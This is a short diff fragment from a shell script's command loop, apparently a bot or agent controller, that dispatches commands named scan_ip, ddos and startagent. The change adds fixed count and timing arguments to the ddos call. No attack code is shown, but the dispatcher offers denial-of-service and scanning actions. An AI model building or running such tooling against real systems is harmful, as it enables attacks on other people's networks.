@@ -538,7 +538,7 @@ while true; do
             scan_ip "$args"
             ;;
          "ddos")
-            ddos "$args"
+            ddos "$args" -n 50 -t 5
             ;;
         "startagent")
             start_agent "$args"
